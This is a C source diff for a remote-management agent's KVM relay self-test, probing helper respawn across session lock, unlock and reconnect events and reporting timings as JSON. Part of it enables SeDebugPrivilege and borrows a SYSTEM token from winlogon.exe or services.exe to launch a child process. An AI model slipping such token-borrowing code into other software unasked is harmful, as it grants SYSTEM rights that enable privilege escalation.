+	if (elapsedMsOut != NULL) { *elapsedMsOut = 0; }
+	if (pid == 0) { return FALSE; }
+
+	while ((GetTickCount64() - started) <= timeoutMs)
+	{
+		if (!MeshService_IsProcessAliveById(pid))
+		{
+			if (elapsedMsOut != NULL) { *elapsedMsOut = (DWORD)(GetTickCount64() - started); }
+			return TRUE;
+		}
+		Sleep(50);
+	}
+	return FALSE;
+}
+
+static BOOL MeshService_WaitForBridgePidChange(DWORD previousPid, DWORD timeoutMs, DWORD* elapsedMsOut, DWORD* pidOut)
+{
+	ULONGLONG started = GetTickCount64();
+
+	if (elapsedMsOut != NULL) { *elapsedMsOut = 0; }
+	if (pidOut != NULL) { *pidOut = 0; }
+
+	while ((GetTickCount64() - started) <= timeoutMs)
+	{
+		DWORD pid = (g_slavekvm > 0) ? (DWORD)g_slavekvm : 0;
+		if (pid != 0 && pid != previousPid && MeshService_IsProcessAliveById(pid))
+		{
+			if (elapsedMsOut != NULL) { *elapsedMsOut = (DWORD)(GetTickCount64() - started); }
+			if (pidOut != NULL) { *pidOut = pid; }
+			return TRUE;
+		}
+		Sleep(50);
+	}
+	return FALSE;
+}
+
+static BOOL MeshService_WaitForBridgePidForReserved(void* reserved, DWORD previousPid, DWORD timeoutMs, DWORD* elapsedMsOut, DWORD* pidOut)
+{
+	ULONGLONG started = GetTickCount64();
+
+	if (elapsedMsOut != NULL) { *elapsedMsOut = 0; }
+	if (pidOut != NULL) { *pidOut = 0; }
+	if (reserved == NULL) { return FALSE; }
+
+	while ((GetTickCount64() - started) <= timeoutMs)
+	{
+		DWORD pid = kvm_bridge_debug_get_child_pid_for_reserved(reserved);
+		if (pid != 0 && pid != previousPid && MeshService_IsProcessAliveById(pid))
+		{
+			if (elapsedMsOut != NULL) { *elapsedMsOut = (DWORD)(GetTickCount64() - started); }
+			if (pidOut != NULL) { *pidOut = pid; }
+			return TRUE;
+		}
+		Sleep(50);
+	}
+	return FALSE;
+}
+
+static BOOL MeshService_RequestKvmRelayRefreshAndWait(MeshServiceKvmSessionChangeProbeState* state, DWORD timeoutMs, DWORD* elapsedMsOut)
+{
+	ULONGLONG started = GetTickCount64();
+	LONG baselinePackets = 0;
+
+	if (elapsedMsOut != NULL) { *elapsedMsOut = 0; }
+	if (state == NULL) { return FALSE; }
+
+	baselinePackets = MeshService_KvmSessionChangeProbeTotalPackets(state);
+	kvm_pause(0, state);
+	kvm_relay_reset(MeshService_KvmSessionChangeProbeWriteSink, state);
+
+	while ((GetTickCount64() - started) <= timeoutMs)
+	{
+		if (MeshService_KvmSessionChangeProbeTotalPackets(state) > baselinePackets)
+		{
+			if (elapsedMsOut != NULL) { *elapsedMsOut = (DWORD)(GetTickCount64() - started); }
+			return TRUE;
+		}
+		Sleep(50);
+	}
+	return FALSE;
+}
+
+static BOOL MeshService_WaitForKvmRelayPicture(MeshServiceKvmSessionChangeProbeState* state, DWORD timeoutMs, DWORD* elapsedMsOut)
+{
+	ULONGLONG started = GetTickCount64();
+	LONG baselinePictures = 0;
+
+	if (elapsedMsOut != NULL) { *elapsedMsOut = 0; }
+	if (state == NULL) { return FALSE; }
+
+	baselinePictures = state->picturePackets + state->jumboPackets;
+	while ((GetTickCount64() - started) <= timeoutMs)
+	{
+		if ((state->picturePackets + state->jumboPackets) > baselinePictures)
+		{
+			if (elapsedMsOut != NULL) { *elapsedMsOut = (DWORD)(GetTickCount64() - started); }
+			return TRUE;
+		}
+		Sleep(50);
+	}
+	return FALSE;
+}
+
+static int MeshService_RunKvmBridgeSessionChangeProbeWorkerCommand(void)
+{
+	MeshServiceKvmSessionChangeProbeState state;
+	char exePath[MAX_PATH * 4] = { 0 };
+	void* chain = NULL;
+	void* pipeManager = NULL;
+	HANDLE chainThread = NULL;
+	DWORD sessionId = MeshService_GetCurrentSessionId();
+	DWORD initialPid = 0;
+	DWORD unlockPid = 0;
+	DWORD reconnectPid = 0;
+	DWORD initialSpawnMs = 0;
+	DWORD initialPacketMs = 0;
+	DWORD initialPictureMs = 0;
+	DWORD lockStopMs = 0;
+	DWORD unlockRespawnMs = 0;
+	DWORD unlockPacketMs = 0;
+	DWORD unlockPictureMs = 0;
+	DWORD disconnectStopMs = 0;
+	DWORD reconnectRespawnMs = 0;
+	DWORD reconnectPacketMs = 0;
+	DWORD reconnectPictureMs = 0;
+	DWORD cleanupExitMs = 0;
+	DWORD initialBridgeFailureError = 0;
+	DWORD initialBridgeFailureStage = 0;
+	DWORD initialBridgeFailureSpawnType = 0;
+	DWORD postLockPendingEvent = 0;
+	DWORD postLockPendingSessionId = 0;
+	DWORD postUnlockPendingEvent = 0;
+	DWORD postUnlockPendingSessionId = 0;
+	DWORD postUnlockBridgeFailureError = 0;
+	DWORD postUnlockBridgeFailureStage = 0;
+	DWORD postUnlockBridgeFailureSpawnType = 0;
+	DWORD postUnlockProcessSessionId = 0;
+	BOOL chainCreated = FALSE;
+	BOOL chainThreadStarted = FALSE;
+	BOOL relayStarted = FALSE;
+	BOOL initialSpawned = FALSE;
+	BOOL initialPacketsReady = FALSE;
+	BOOL initialPicturesReady = FALSE;
+	BOOL lockStopped = FALSE;
+	BOOL helperAbsentDuringLock = FALSE;
+	BOOL unlockRespawned = FALSE;
+	BOOL unlockPacketsReady = FALSE;
+	BOOL unlockPicturesReady = FALSE;
+	BOOL disconnectStopped = FALSE;
+	BOOL helperAbsentDuringDisconnect = FALSE;
+	BOOL reconnectRespawned = FALSE;
+	BOOL reconnectPacketsReady = FALSE;
+	BOOL reconnectPicturesReady = FALSE;
+	BOOL cleanupExited = FALSE;
+	BOOL success = FALSE;
+	BOOL initialBridgeAvailable = FALSE;
+	BOOL initialBridgeUsed = FALSE;
+	BOOL initialFallbackUsed = FALSE;
+	BOOL initialTransportActive = FALSE;
+	BOOL postLockChildPresent = FALSE;
+	BOOL postLockChildExitSignaled = FALSE;
+	BOOL postLockRestartSuppressed = FALSE;
+	BOOL postLockPendingRestart = FALSE;
+	BOOL postLockTransportActive = FALSE;
+	BOOL postUnlockChildPresent = FALSE;
+	BOOL postUnlockChildExitSignaled = FALSE;
+	BOOL postUnlockRestartSuppressed = FALSE;
+	BOOL postUnlockPendingRestart = FALSE;
+	BOOL postUnlockTransportActive = FALSE;
+	BOOL postUnlockBridgeAvailable = FALSE;
+	BOOL postUnlockBridgeUsed = FALSE;
+	BOOL postUnlockFallbackUsed = FALSE;
+	DWORD chainThreadWaitResult = WAIT_FAILED;
+
+	ZeroMemory(&state, sizeof(state));
+	if (sessionId == 0 || sessionId == 0xFFFFFFFF)
+	{
+		printf("{\"success\":false,\"phase\":\"kvm-bridge-session-change-probe\",\"sessionId\":%lu,\"error\":\"invalid-session\"}\n", (unsigned long)sessionId);
+		fflush(stdout);
+		return 1;
+	}
+
+	chain = ILibCreateChainEx(0);
+	chainCreated = (chain != NULL);
+	if (chainCreated)
+	{
+		pipeManager = ILibProcessPipe_Manager_Create(chain);
+	}
+	if (pipeManager != NULL)
+	{
+		chainThread = CreateThread(NULL, 0, MeshService_KvmSessionChangeProbeChainThread, chain, 0, NULL);
+		chainThreadStarted = (chainThread != NULL);
+	}
+
+	if (!chainThreadStarted)
+	{
+		printf("{\"success\":false,\"phase\":\"kvm-bridge-session-change-probe\",\"sessionId\":%lu,\"chainCreated\":%s,\"chainThreadStarted\":%s}\n",
+			(unsigned long)sessionId,
+			chainCreated ? "true" : "false",
+			chainThreadStarted ? "true" : "false");
+		fflush(stdout);
+		if (chain != NULL) { ILibStopChain(chain); }
+		if (chainThread != NULL) { CloseHandle(chainThread); }
+		return 1;
+	}
+
+	Sleep(200);
+	GetModuleFileNameA(NULL, exePath, (DWORD)sizeof(exePath));
+	relayStarted = (kvm_relay_setup(exePath, pipeManager, MeshService_KvmSessionChangeProbeWriteSink, &state, (int)sessionId) != 0);
+	initialBridgeAvailable = (kvm_bridge_debug_get_last_bridge_available() != 0);
+	initialBridgeUsed = (kvm_bridge_debug_get_last_used_bridge() != 0);
+	initialFallbackUsed = (kvm_bridge_debug_get_last_fallback_used() != 0);
+	initialTransportActive = (kvm_bridge_debug_get_transport_active() != 0);
+	initialBridgeFailureError = kvm_bridge_debug_get_last_bridge_failure_error();
+	initialBridgeFailureStage = kvm_bridge_debug_get_last_bridge_failure_stage();
+	initialBridgeFailureSpawnType = kvm_bridge_debug_get_last_bridge_failure_spawn_type();
+	if (relayStarted)
+	{
+		initialSpawned = MeshService_WaitForBridgePidChange(0, 5000, &initialSpawnMs, &initialPid);
+		if (initialSpawned)
+		{
+			initialPacketsReady = MeshService_RequestKvmRelayRefreshAndWait(&state, 5000, &initialPacketMs);
+			if (initialPacketsReady)
+			{
+				initialPicturesReady = MeshService_WaitForKvmRelayPicture(&state, 15000, &initialPictureMs);
+			}
+			initialBridgeAvailable = (kvm_bridge_debug_get_last_bridge_available() != 0);
+			initialBridgeUsed = (kvm_bridge_debug_get_last_used_bridge() != 0);
+			initialFallbackUsed = (kvm_bridge_debug_get_last_fallback_used() != 0);
+			initialTransportActive = (kvm_bridge_debug_get_transport_active() != 0);
+			initialBridgeFailureError = kvm_bridge_debug_get_last_bridge_failure_error();
+			initialBridgeFailureStage = kvm_bridge_debug_get_last_bridge_failure_stage();
+			initialBridgeFailureSpawnType = kvm_bridge_debug_get_last_bridge_failure_spawn_type();
+		}
+	}
+
+	if (initialPacketsReady)
+	{
+		kvm_notify_session_change(WTS_SESSION_LOCK, sessionId);
+		lockStopped = MeshService_WaitForProcessExitById(initialPid, 5000, &lockStopMs);
+		if (lockStopped)
+		{
+			Sleep(500);
+			postLockChildPresent = (kvm_bridge_debug_get_child_present() != 0);
+			postLockChildExitSignaled = (kvm_bridge_debug_is_child_exit_signaled() != 0);
+			postLockRestartSuppressed = (kvm_bridge_debug_get_restart_suppressed() != 0);
+			postLockPendingRestart = (kvm_bridge_debug_peek_pending_session_restart(&postLockPendingEvent, &postLockPendingSessionId) != 0);
+			postLockTransportActive = (kvm_bridge_debug_get_transport_active() != 0);
+			helperAbsentDuringLock = !MeshService_IsProcessAliveById(initialPid);
+			if (g_slavekvm > 0 && (DWORD)g_slavekvm != initialPid && MeshService_IsProcessAliveById((DWORD)g_slavekvm))
+			{
+				helperAbsentDuringLock = FALSE;
+			}
+		}
+	}
+
+	if (helperAbsentDuringLock)
+	{
+		kvm_notify_session_change(WTS_SESSION_UNLOCK, sessionId);
+		unlockRespawned = MeshService_WaitForBridgePidChange(initialPid, 5000, &unlockRespawnMs, &unlockPid);
+		postUnlockChildPresent = (kvm_bridge_debug_get_child_present() != 0);
+		postUnlockChildExitSignaled = (kvm_bridge_debug_is_child_exit_signaled() != 0);
+		postUnlockRestartSuppressed = (kvm_bridge_debug_get_restart_suppressed() != 0);
+		postUnlockPendingRestart = (kvm_bridge_debug_peek_pending_session_restart(&postUnlockPendingEvent, &postUnlockPendingSessionId) != 0);
+		postUnlockTransportActive = (kvm_bridge_debug_get_transport_active() != 0);
+		postUnlockProcessSessionId = kvm_bridge_debug_get_process_session_id();
+		postUnlockBridgeAvailable = (kvm_bridge_debug_get_last_bridge_available() != 0);
+		postUnlockBridgeUsed = (kvm_bridge_debug_get_last_used_bridge() != 0);
+		postUnlockFallbackUsed = (kvm_bridge_debug_get_last_fallback_used() != 0);
+		postUnlockBridgeFailureError = kvm_bridge_debug_get_last_bridge_failure_error();
+		postUnlockBridgeFailureStage = kvm_bridge_debug_get_last_bridge_failure_stage();
+		postUnlockBridgeFailureSpawnType = kvm_bridge_debug_get_last_bridge_failure_spawn_type();
+		if (unlockRespawned)
+		{
+			unlockPacketsReady = MeshService_RequestKvmRelayRefreshAndWait(&state, 5000, &unlockPacketMs);
+			if (unlockPacketsReady)
+			{
+				unlockPicturesReady = MeshService_WaitForKvmRelayPicture(&state, 15000, &unlockPictureMs);
+			}
+		}
+	}
+
+	if (unlockPacketsReady)
+	{
+		kvm_notify_session_change(WTS_CONSOLE_DISCONNECT, sessionId);
+		disconnectStopped = MeshService_WaitForProcessExitById(unlockPid, 5000, &disconnectStopMs);
+		if (disconnectStopped)
+		{
+			Sleep(500);
+			helperAbsentDuringDisconnect = !MeshService_IsProcessAliveById(unlockPid);
+			if (g_slavekvm > 0 && (DWORD)g_slavekvm != unlockPid && MeshService_IsProcessAliveById((DWORD)g_slavekvm))
+			{
+				helperAbsentDuringDisconnect = FALSE;
+			}
+		}
+	}
+
+	if (helperAbsentDuringDisconnect)
+	{
+		kvm_notify_session_change(WTS_CONSOLE_CONNECT, sessionId);
+		reconnectRespawned = MeshService_WaitForBridgePidChange(unlockPid, 5000, &reconnectRespawnMs, &reconnectPid);
+		if (reconnectRespawned)
+		{
+			reconnectPacketsReady = MeshService_RequestKvmRelayRefreshAndWait(&state, 5000, &reconnectPacketMs);
+			if (reconnectPacketsReady)
+			{
+				reconnectPicturesReady = MeshService_WaitForKvmRelayPicture(&state, 15000, &reconnectPictureMs);
+			}
+		}
+	}
+
+	if (relayStarted)
+	{
+		kvm_cleanup(&state);
+		if (reconnectPid != 0)
+		{
+			cleanupExited = MeshService_WaitForProcessExitById(reconnectPid, 5000, &cleanupExitMs);
+		}
+		else if (unlockPid != 0)
+		{
+			cleanupExited = MeshService_WaitForProcessExitById(unlockPid, 5000, &cleanupExitMs);
+		}
+		else if (initialPid != 0)
+		{
+			cleanupExited = MeshService_WaitForProcessExitById(initialPid, 5000, &cleanupExitMs);
+		}
+		Sleep(250);
+	}
+
+	success =
+		relayStarted &&
+		initialSpawned &&
+		initialPacketsReady &&
+		initialPicturesReady &&
+		lockStopped &&
+		lockStopMs <= 2000 &&
+		helperAbsentDuringLock &&
+		unlockRespawned &&
+		unlockRespawnMs <= 2000 &&
+		unlockPacketsReady &&
+		unlockPicturesReady &&
+		disconnectStopped &&
+		disconnectStopMs <= 2000 &&
+		helperAbsentDuringDisconnect &&
+		reconnectRespawned &&
+		reconnectRespawnMs <= 2000 &&
+		reconnectPacketsReady &&
+		reconnectPicturesReady &&
+		cleanupExited &&
+		cleanupExitMs <= 5000;
+
+	printf("{\"success\":%s,", success ? "true" : "false");
+	printf("\"phase\":\"kvm-bridge-session-change-probe\",");
+	printf("\"sessionId\":%lu,", (unsigned long)sessionId);
+	printf("\"chainCreated\":%s,", chainCreated ? "true" : "false");
+	printf("\"chainThreadStarted\":%s,", chainThreadStarted ? "true" : "false");
+	printf("\"relayStarted\":%s,", relayStarted ? "true" : "false");
+	printf("\"initialBridgeAvailable\":%s,", initialBridgeAvailable ? "true" : "false");
+	printf("\"initialBridgeUsed\":%s,", initialBridgeUsed ? "true" : "false");
+	printf("\"initialFallbackUsed\":%s,", initialFallbackUsed ? "true" : "false");
+	printf("\"initialTransportActive\":%s,", initialTransportActive ? "true" : "false");
+	printf("\"initialBridgeFailureError\":%lu,", (unsigned long)initialBridgeFailureError);
+	printf("\"initialBridgeFailureStage\":%lu,", (unsigned long)initialBridgeFailureStage);
+	printf("\"initialBridgeFailureSpawnType\":%lu,", (unsigned long)initialBridgeFailureSpawnType);
+	printf("\"initialPid\":%lu,", (unsigned long)initialPid);
+	printf("\"unlockPid\":%lu,", (unsigned long)unlockPid);
+	printf("\"reconnectPid\":%lu,", (unsigned long)reconnectPid);
+	printf("\"initialSpawnMs\":%lu,", (unsigned long)initialSpawnMs);
+	printf("\"initialPacketMs\":%lu,", (unsigned long)initialPacketMs);
+	printf("\"initialPictureMs\":%lu,", (unsigned long)initialPictureMs);
+	printf("\"lockStopped\":%s,", lockStopped ? "true" : "false");
+	printf("\"lockStopMs\":%lu,", (unsigned long)lockStopMs);
+	printf("\"helperAbsentDuringLock\":%s,", helperAbsentDuringLock ? "true" : "false");
+	printf("\"postLockChildPresent\":%s,", postLockChildPresent ? "true" : "false");
+	printf("\"postLockChildExitSignaled\":%s,", postLockChildExitSignaled ? "true" : "false");
+	printf("\"postLockRestartSuppressed\":%s,", postLockRestartSuppressed ? "true" : "false");
+	printf("\"postLockPendingRestart\":%s,", postLockPendingRestart ? "true" : "false");
+	printf("\"postLockPendingEvent\":%lu,", (unsigned long)postLockPendingEvent);
+	printf("\"postLockPendingSessionId\":%lu,", (unsigned long)postLockPendingSessionId);
+	printf("\"postLockTransportActive\":%s,", postLockTransportActive ? "true" : "false");
+	printf("\"unlockRespawned\":%s,", unlockRespawned ? "true" : "false");
+	printf("\"unlockRespawnMs\":%lu,", (unsigned long)unlockRespawnMs);
+	printf("\"unlockPacketMs\":%lu,", (unsigned long)unlockPacketMs);
+	printf("\"unlockPictureMs\":%lu,", (unsigned long)unlockPictureMs);
+	printf("\"postUnlockChildPresent\":%s,", postUnlockChildPresent ? "true" : "false");
+	printf("\"postUnlockChildExitSignaled\":%s,", postUnlockChildExitSignaled ? "true" : "false");
+	printf("\"postUnlockRestartSuppressed\":%s,", postUnlockRestartSuppressed ? "true" : "false");
+	printf("\"postUnlockPendingRestart\":%s,", postUnlockPendingRestart ? "true" : "false");
+	printf("\"postUnlockPendingEvent\":%lu,", (unsigned long)postUnlockPendingEvent);
+	printf("\"postUnlockPendingSessionId\":%lu,", (unsigned long)postUnlockPendingSessionId);
+	printf("\"postUnlockProcessSessionId\":%lu,", (unsigned long)postUnlockProcessSessionId);
+	printf("\"postUnlockTransportActive\":%s,", postUnlockTransportActive ? "true" : "false");
+	printf("\"postUnlockBridgeAvailable\":%s,", postUnlockBridgeAvailable ? "true" : "false");
+	printf("\"postUnlockBridgeUsed\":%s,", postUnlockBridgeUsed ? "true" : "false");
+	printf("\"postUnlockFallbackUsed\":%s,", postUnlockFallbackUsed ? "true" : "false");
+	printf("\"postUnlockBridgeFailureError\":%lu,", (unsigned long)postUnlockBridgeFailureError);
+	printf("\"postUnlockBridgeFailureStage\":%lu,", (unsigned long)postUnlockBridgeFailureStage);
+	printf("\"postUnlockBridgeFailureSpawnType\":%lu,", (unsigned long)postUnlockBridgeFailureSpawnType);
+	printf("\"disconnectStopped\":%s,", disconnectStopped ? "true" : "false");
+	printf("\"disconnectStopMs\":%lu,", (unsigned long)disconnectStopMs);
+	printf("\"helperAbsentDuringDisconnect\":%s,", helperAbsentDuringDisconnect ? "true" : "false");
+	printf("\"reconnectRespawned\":%s,", reconnectRespawned ? "true" : "false");
+	printf("\"reconnectRespawnMs\":%lu,", (unsigned long)reconnectRespawnMs);
+	printf("\"reconnectPacketMs\":%lu,", (unsigned long)reconnectPacketMs);
+	printf("\"reconnectPictureMs\":%lu,", (unsigned long)reconnectPictureMs);
+	printf("\"cleanupExited\":%s,", cleanupExited ? "true" : "false");
+	printf("\"cleanupExitMs\":%lu,", (unsigned long)cleanupExitMs);
+	printf("\"lastScreenWidth\":%ld,", state.lastScreenWidth);
+	printf("\"lastScreenHeight\":%ld,", state.lastScreenHeight);
+	printf("\"screenPackets\":%ld,", state.screenPackets);
+	printf("\"displayListPackets\":%ld,", state.displayListPackets);
+	printf("\"displayInfoPackets\":%ld,", state.displayInfoPackets);
+	printf("\"cursorPackets\":%ld,", state.cursorPackets);
+	printf("\"picturePackets\":%ld,", state.picturePackets);
+	printf("\"jumboPackets\":%ld}\n", state.jumboPackets);
+	fflush(stdout);
+
+	if (chain != NULL) { ILibStopChain(chain); }
+	if (chainThread != NULL)
+	{
+		chainThreadWaitResult = WaitForSingleObject(chainThread, 5000);
+		UNREFERENCED_PARAMETER(chainThreadWaitResult);
+		CloseHandle(chainThread);
+	}
+	return success ? 0 : 1;
+}
+
+static int MeshService_RunKvmBridgeSessionChangeProbeChildCommand(const WCHAR* reportPath)
+{
+	FILE* redirectedStdout = NULL;
+	errno_t redirectError = 0;
+
+	if (reportPath != NULL && reportPath[0] != L'\0')
+	{
+		redirectError = _wfreopen_s(&redirectedStdout, reportPath, L"wb", stdout);
+		if (redirectError != 0 || redirectedStdout == NULL)
+		{
+			return 1;
+		}
+	}
+	return MeshService_RunKvmBridgeSessionChangeProbeWorkerCommand();
+}
+
+static int MeshService_RunKvmBridgeSessionChangeProbeCommand(void)
+{
+	WCHAR tempPath[MAX_PATH] = { 0 };
+	WCHAR reportPath[MAX_PATH] = { 0 };
+	WCHAR arguments[512] = { 0 };
+	HANDLE systemToken = NULL;
+	PROCESS_INFORMATION childProcess;
+	DWORD sessionId = MeshService_GetCurrentSessionId();
+	DWORD systemTokenError = ERROR_SUCCESS;
+	DWORD spawnError = ERROR_SUCCESS;
+	DWORD childExitCode = STILL_ACTIVE;
+	BOOL systemTokenReady = FALSE;
+	BOOL childSpawned = FALSE;
+	char* childJson = NULL;
+
+	if (MeshService_ProcessHasSystemSid())
+	{
+		return MeshService_RunKvmBridgeSessionChangeProbeWorkerCommand();
+	}
+
+	ZeroMemory(&childProcess, sizeof(childProcess));
+	if (ExpandEnvironmentStringsW(L"%TEMP%\\", tempPath, (DWORD)_countof(tempPath)) == 0 || tempPath[0] == L'\0')
+	{
+		GetTempPathW((DWORD)_countof(tempPath), tempPath);
+	}
+	StringCchPrintfW(reportPath, _countof(reportPath), L"%lsMeshKvmSessionChangeProbe_%lu.json", tempPath, GetCurrentProcessId());
+	DeleteFileW(reportPath);
+
+	MeshService_EnableNamedPrivilegeW(L"SeDebugPrivilege");
+	systemTokenReady = MeshService_OpenPrimarySystemTokenForSession(sessionId, &systemToken, &systemTokenError);
+	if (systemTokenReady)
+	{
+		StringCchPrintfW(arguments, _countof(arguments), L"-kvm-bridge-session-change-probe-child \"%ls\"", reportPath);
+		childSpawned = MeshService_SpawnProcessWithTokenW(systemToken, arguments, L"winsta0\\default", &childProcess, &spawnError);
+	}
+
+	if (childSpawned)
+	{
+		WaitForSingleObject(childProcess.hProcess, 60000);
+		GetExitCodeProcess(childProcess.hProcess, &childExitCode);
+	}
+
+	childJson = MeshService_ReadUtf8TextFileW(reportPath);
+	if (childJson != NULL)
+	{
+		printf("%s\n", childJson);
+	}
+	else
+	{
+		printf("{\"success\":false,\"phase\":\"kvm-bridge-session-change-probe\",\"sessionId\":%lu,\"systemTokenReady\":%s,\"childSpawned\":%s,\"systemTokenError\":%lu,\"spawnError\":%lu,\"childExitCode\":%lu}\n",
+			(unsigned long)sessionId,
+			systemTokenReady ? "true" : "false",
+			childSpawned ? "true" : "false",
+			(unsigned long)systemTokenError,
+			(unsigned long)spawnError,
+			(unsigned long)childExitCode);
+	}
+	fflush(stdout);
+
+	if (childProcess.hThread != NULL) { CloseHandle(childProcess.hThread); }
+	if (childProcess.hProcess != NULL) { CloseHandle(childProcess.hProcess); }
+	if (systemToken != NULL) { CloseHandle(systemToken); }
+	if (childJson != NULL) { free(childJson); }
+	DeleteFileW(reportPath);
+
+	return (childSpawned && childExitCode == 0 && childJson != NULL) ? 0 : 1;
+}
+
+extern int g_shutdown;
+extern int kvmConsoleMode;
+
+typedef struct MeshServiceSecureDesktopProbeState
+{
+	LONG screenPackets;
+	LONG displayPackets;
+	LONG winlogonScreenPackets;
+	DWORD timeoutMs;
+	ULONGLONG startedTick;
+	ULONGLONG firstWinlogonTick;
+	char initialDesktop[64];
+	char finalDesktop[64];
+} MeshServiceSecureDesktopProbeState;
+
+static void MeshService_FilePrintJsonEscapedUtf8(FILE* file, const char* value)
+{
+	const unsigned char* cursor = (const unsigned char*)((value != NULL) ? value : "");
+	while (*cursor != '\0')
+	{
+		switch (*cursor)
+		{
+		case '\\': fputs("\\\\", file); break;
+		case '"': fputs("\\\"", file); break;
+		case '\n': fputs("\\n", file); break;
+		case '\r': fputs("\\r", file); break;
+		case '\t': fputs("\\t", file); break;
+		default: fputc(*cursor, file); break;
+		}
+		++cursor;
+	}
+}
+
+static void MeshService_FilePrintJsonEscapedWide(FILE* file, const wchar_t* value)
+{
+	int needed = 0;
+	char* utf8 = NULL;
+
+	if (file == NULL || value == NULL || value[0] == L'\0') { return; }
+	needed = WideCharToMultiByte(CP_UTF8, 0, value, -1, NULL, 0, NULL, NULL);
+	if (needed <= 0) { return; }
+
+	utf8 = (char*)malloc((size_t)needed);
+	if (utf8 == NULL) { return; }
+	if (WideCharToMultiByte(CP_UTF8, 0, value, -1, utf8, needed, NULL, NULL) > 0)
+	{
+		MeshService_FilePrintJsonEscapedUtf8(file, utf8);
+	}
+	free(utf8);
+}
+
+static BOOL MeshService_WriteUtf8TextFileW(const WCHAR* path, const char* content)
+{
+	FILE* file = NULL;
+	errno_t err = 0;
+
+	if (path == NULL || path[0] == L'\0' || content == NULL) { return FALSE; }
+	err = _wfopen_s(&file, path, L"wb");
+	if (err != 0 || file == NULL) { return FALSE; }
+	fputs(content, file);
+	fclose(file);
+	return TRUE;
+}
+
+static char* MeshService_ReadUtf8TextFileW(const WCHAR* path)
+{
+	HANDLE file = INVALID_HANDLE_VALUE;
+	LARGE_INTEGER size;
+	DWORD read = 0;
+	char* buffer = NULL;
+
+	if (path == NULL || path[0] == L'\0') { return NULL; }
+	file = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (file == INVALID_HANDLE_VALUE) { return NULL; }
+	if (!GetFileSizeEx(file, &size) || size.QuadPart < 0 || size.QuadPart > 1024 * 1024)
+	{
+		CloseHandle(file);
+		return NULL;
+	}
+
+	buffer = (char*)malloc((size_t)size.QuadPart + 1);
+	if (buffer == NULL)
+	{
+		CloseHandle(file);
+		return NULL;
+	}
+	if (size.QuadPart > 0 && !ReadFile(file, buffer, (DWORD)size.QuadPart, &read, NULL))
+	{
+		free(buffer);
+		CloseHandle(file);
+		return NULL;
+	}
+	buffer[read] = '\0';
+	CloseHandle(file);
+	return buffer;
+}
+
+static BOOL MeshService_EnableNamedPrivilegeW(const WCHAR* privilegeName)
+{
+	HANDLE token = NULL;
+	TOKEN_PRIVILEGES privileges;
+	LUID luid;
+	BOOL ok = FALSE;
+
+	if (privilegeName == NULL || privilegeName[0] == L'\0') { return FALSE; }
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) { return FALSE; }
+	if (!LookupPrivilegeValueW(NULL, privilegeName, &luid))
+	{
+		CloseHandle(token);
+		return FALSE;
+	}
+
+	ZeroMemory(&privileges, sizeof(privileges));
+	privileges.PrivilegeCount = 1;
+	privileges.Privileges[0].Luid = luid;
+	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+	if (AdjustTokenPrivileges(token, FALSE, &privileges, sizeof(privileges), NULL, NULL) && GetLastError() == ERROR_SUCCESS)
+	{
+		ok = TRUE;
+	}
+	CloseHandle(token);
+	return ok;
+}
+
+static BOOL MeshService_SetTokenIntegrityLevelToMedium(HANDLE token)
+{
+	PSID mediumSid = NULL;
+	TOKEN_MANDATORY_LABEL mandatoryLabel;
+	DWORD labelSize = 0;
+	BOOL ok = FALSE;
+
+	if (token == NULL) { return FALSE; }
+	if (!ConvertStringSidToSidW(L"S-1-16-8192", &mediumSid)) { return FALSE; }
+
+	ZeroMemory(&mandatoryLabel, sizeof(mandatoryLabel));
+	mandatoryLabel.Label.Attributes = SE_GROUP_INTEGRITY;
+	mandatoryLabel.Label.Sid = mediumSid;
+	labelSize = sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(mediumSid);
+	ok = SetTokenInformation(token, TokenIntegrityLevel, &mandatoryLabel, labelSize);
+
+	LocalFree(mediumSid);
+	return ok;
+}
+
+static DWORD MeshService_GetCurrentSessionId(void)
+{
+	DWORD sessionId = WTSGetActiveConsoleSessionId();
+	DWORD currentSessionId = 0;
+
+	if (ProcessIdToSessionId(GetCurrentProcessId(), &currentSessionId))
+	{
+		if (!(MeshService_ProcessHasSystemSid() && currentSessionId == 0 && sessionId != 0xFFFFFFFF))
+		{
+			sessionId = currentSessionId;
+		}
+	}
+	return sessionId;
+}
+
+static BOOL MeshService_FindProcessIdByNameAndSessionW(const WCHAR* processName, DWORD sessionId, DWORD* pidOut)
+{
+	HANDLE snapshot = INVALID_HANDLE_VALUE;
+	PROCESSENTRY32W entry;
+	BOOL found = FALSE;
+
+	if (pidOut != NULL) { *pidOut = 0; }
+	if (processName == NULL || processName[0] == L'\0' || pidOut == NULL) { return FALSE; }
+
+	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (snapshot == INVALID_HANDLE_VALUE) { return FALSE; }
+
+	ZeroMemory(&entry, sizeof(entry));
+	entry.dwSize = sizeof(entry);
+	if (!Process32FirstW(snapshot, &entry))
+	{
+		CloseHandle(snapshot);
+		return FALSE;
+	}
+
+	do
+	{
+		DWORD processSessionId = 0;
+		if (_wcsicmp(entry.szExeFile, processName) != 0) { continue; }
+		if (!ProcessIdToSessionId(entry.th32ProcessID, &processSessionId)) { continue; }
+		if (sessionId != 0xFFFFFFFF && processSessionId != sessionId) { continue; }
+		*pidOut = entry.th32ProcessID;
+		found = TRUE;
+		break;
+	} while (Process32NextW(snapshot, &entry));
+
+	CloseHandle(snapshot);
+	return found;
+}
+
+static BOOL MeshService_OpenPrimarySystemTokenForSession(DWORD sessionId, HANDLE* tokenOut, DWORD* errorOut)
+{
+	const WCHAR* candidates[2] = { L"winlogon.exe", L"services.exe" };
+	const DWORD candidateSessions[2] = { sessionId, 0xFFFFFFFF };
+	int i = 0;
+
+	if (tokenOut != NULL) { *tokenOut = NULL; }
+	if (errorOut != NULL) { *errorOut = ERROR_SUCCESS; }
+	if (tokenOut == NULL)
+	{
+		if (errorOut != NULL) { *errorOut = ERROR_INVALID_PARAMETER; }
+		return FALSE;
+	}
+	if (MeshService_ProcessHasSystemSid())
+	{
+		HANDLE currentToken = NULL;
+		HANDLE duplicatedToken = NULL;
